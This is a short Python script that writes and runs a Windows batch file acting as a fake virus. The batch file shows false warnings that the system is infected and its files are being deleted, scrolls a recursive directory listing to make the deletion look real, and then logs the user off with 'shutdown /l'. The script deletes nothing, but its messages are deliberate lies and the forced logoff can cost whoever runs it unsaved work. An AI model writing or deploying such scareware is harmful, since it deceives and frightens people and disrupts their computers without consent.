import os
import subprocess
import tempfile
message = '''@echo off
color 0a
echo WARNING! Virus detected...
ping localhost -n 3 >nul
echo Deleting system files...
dir /s
echo Computer successfully infected.
ping localhost -n 3 >nul
shutdown /l
'''
temp_dir = tempfile.gettempdir()
vi_file = os.path.join(temp_dir, "vi.bat")
with open(vi_file, "w") as file:
    file.write(message)
subprocess.Popen(["cmd.exe", "/k", vi_file])

